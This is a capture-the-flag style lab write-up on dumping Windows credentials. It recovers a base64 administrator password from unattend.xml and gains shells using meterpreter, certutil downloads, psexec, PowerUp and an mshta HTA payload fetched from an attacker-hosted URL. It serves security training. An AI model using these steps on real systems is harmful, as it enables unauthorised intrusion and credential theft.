# 🔬Windows Credentials Dumping

## Lab 1 - Unattended Files <a href="#lab-1-unattended-files" id="lab-1-unattended-files"></a>

> 🔬 [Unattended Installation](https://attackdefense.com/challengedetails?cid=2106)
>
> * Target IP: `10.0.17.233`
> * Searching for password in Windows Configuration files
> * Both Kali Machine and Attacker/Victim Windows machine are provided

* On the Attacker machine check the current user

<figure><img src="../../../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

### Exploitation

* From the Kali machine, generate a `meterpreter` x64 payload

<figure><img src="../../../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

* Set up a web server to host the payload

<figure><img src="../../../../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

* Download the payload file on the target system using the `certutil` tool in `cmd`

<figure><img src="../../../../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

* Stop the http server and start `msfconsole` on the Kali machine
* Execute the `payload.exe` on the Win target system and check the reverse shell on Kali

<figure><img src="../../../../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

* Manually search for the **`unattend.xml`** file, it should be inside
  * `C:\\Windows\\Panther`

<figure><img src="../../../../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

* In a new terminal tab

```bash
cat unattend.xml
```

<figure><img src="../../../../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

### Get Access

`administrator` user configured base64 password is **`QWRtaW5AMTIz`**

* Save it to a new file
* Decode it using the `base64` tool

<figure><img src="../../../../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

* Test the `administrator`:`Admin@123root` credentials with the `psexec` tool

```bash
psexec.py administrator@10.0.17.233
```

<figure><img src="../../../../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

### [Powersploit](https://github.com/PowerShellMafia/PowerSploit)

<figure><img src="../../../../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

* Run the `powerup.ps1` Powershell script to find privilege escalation vulnerability on target machine powershell.

```bash
cd .\Desktop\PowerSploit\Privesc\
ls
```

<figure><img src="../../../../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

* Import `PowerUp.ps1` script and Invoke-PrivescAudit function.

```bash
powershell -ep bypass (PowerShell execution policy bypass)
. .\PowerUp.ps1
Invoke-PrivescAudit
```

<figure><img src="../../../../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

* Cat out the file
* Decoding administrator password using Powershell.

```powershell
$password='QWRtaW5AMTIz'
$password=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($pa
ssword))
echo $password
```

<figure><img src="../../../../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

* Run a command prompt as an administrator user using discover credentials.

```powershell
runas.exe /user:administrator cmd
Admin@123
whoami
```

<figure><img src="../../../../../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>



```bash
msfconsole -q
use exploit/windows/misc/hta_server
exploit
```

> “This module hosts an HTML Application (HTA) that when opened will run a payload via Powershell..”

<figure><img src="../../../../../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>

* Copy the generated payload i.e `“http://10.10.21.2:8080/upJ4YOZ3WBfCD.hta”` and run it on `cmd.exe` with mshta command to gain the meterpreter shell.

<figure><img src="../../../../../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>

```bash
sessions -i 1
cd /
cd C:\\Users\\Administrator\\Desktop
dir
cat flag.txt
```

{% hint style="success" %}
Flag: `097ab83639dce0ab3429cb0349493f60`
{% endhint %}





